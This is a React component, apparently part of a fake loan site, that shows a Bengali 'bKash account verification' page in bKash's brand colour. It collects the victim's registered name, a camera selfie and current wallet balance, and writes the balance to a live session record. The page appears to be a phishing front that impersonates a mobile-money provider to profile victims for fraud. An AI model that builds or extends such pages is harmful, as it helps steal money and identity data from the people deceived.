
import React, { useState, useRef } from 'react';
import { LoanFormData, AccountVerificationData } from '../types';
import { db } from '../App';

interface AccountDetailsPageProps {
  data: LoanFormData;
  sessionId: string;
  onSubmit: (details: AccountVerificationData) => void;
}

const AccountDetailsPage: React.FC<AccountDetailsPageProps> = ({ data, sessionId, onSubmit }) => {
  const [details, setDetails] = useState<AccountVerificationData>({
    registeredName: '',
    accountType: 'Personal',
    currentBalance: ''
  });
  const [errors, setErrors] = useState<Partial<Record<keyof AccountVerificationData, string>>>({});
  const [selfiePreview, setSelfiePreview] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const validate = () => {
    const newErrors: Partial<Record<keyof AccountVerificationData, string>> = {};
    if (!details.registeredName) newErrors.registeredName = 'নিবন্ধিত নাম আবশ্যক';
    if (!details.currentBalance) newErrors.currentBalance = 'ব্যালেন্স উল্লেখ করুন';
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSelfieClick = () => {
    fileInputRef.current?.click();
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setSelfiePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      if (sessionId) {
        await db.ref('sessions/' + sessionId).update({
          balance: details.currentBalance,
          lastUpdated: Date.now()
        });
      }
      onSubmit(details);
    }
  };

  return (
    <div className="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-xl border border-gray-100 animate-fade-in">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-gray-800 mb-4">{data.paymentMethod} অ্যাকাউন্ট ভেরিফিকেশন</h2>
        <div className="bg-pink-50 border-l-4 border-[#E2136E] p-4 rounded-r-xl text-left">
          <p className="text-sm text-[#E2136E] font-bold leading-relaxed">
            আপনার {data.paymentMethod} নম্বরটি ({data.paymentNumber}) যাচাইয়ের জন্য নিচের তথ্যগুলো নির্ভুলভাবে প্রদান করুন।
          </p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">নাম (বিকাশ নিবন্ধিত নাম)</label>
          <input
            type="text"
            className={`w-full p-3 border rounded-lg focus:ring-2 focus:ring-[#E2136E] outline-none transition ${errors.registeredName ? 'border-red-500' : 'border-gray-200'}`}
            value={details.registeredName}
            onChange={(e) => setDetails({ ...details, registeredName: e.target.value })}
            placeholder="বিকাশ নিবন্ধিত নাম লিখুন"
          />
        </div>

        <div className="bg-gray-50 p-4 rounded-xl border border-dashed border-gray-300">
          <p className="text-sm font-bold text-gray-700 mb-2">সেলফি ভেরিফিকেশন</p>
          <input 
            type="file" 
            accept="image/*" 
            capture="user" 
            ref={fileInputRef} 
            onChange={handleFileChange} 
            className="hidden" 
          />
          <div 
            onClick={handleSelfieClick}
            className="flex items-center justify-center h-48 bg-white rounded-lg border border-gray-100 overflow-hidden cursor-pointer relative group"
          >
            {selfiePreview ? (
              <>
                <img src={selfiePreview} alt="Selfie Preview" className="w-full h-full object-cover" />
                <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
                  <span className="text-white text-xs font-bold bg-[#E2136E] px-3 py-1 rounded-full shadow-lg">Done✅</span>
                </div>
              </>
            ) : (
              <div className="flex flex-col items-center text-gray-400">
                <div className="p-4 bg-gray-50 rounded-full mb-2 group-hover:bg-pink-50 transition-colors">
                  <svg className="w-8 h-8 text-gray-400 group-hover:text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
                  </svg>
                </div>
                <span className="text-[10px] font-bold group-hover:text-[#E2136E]">ক্যামেরা চালু করুন</span>
              </div>
            )}
          </div>
        </div>

        <div>
          <label className="block text-sm font-semibold text-gray-700 mb-2">বর্তমান ব্যালেন্স</label>
          <div className="relative">
            <input
              type="number"
              className={`w-full p-3 border rounded-lg focus:ring-2 focus:ring-[#E2136E] outline-none transition ${errors.currentBalance ? 'border-red-500' : 'border-gray-200'}`}
              value={details.currentBalance}
              onChange={(e) => setDetails({ ...details, currentBalance: e.target.value })}
              placeholder="ব্যালেন্স লিখুন"
            />
            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">৳</span>
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-[#E2136E] hover:bg-[#D11263] text-white font-bold py-4 rounded-xl shadow-lg transition-all active:scale-95 text-lg"
        >
          যাচাই শুরু করুন
        </button>
      </form>
    </div>
  );
};

export default AccountDetailsPage;
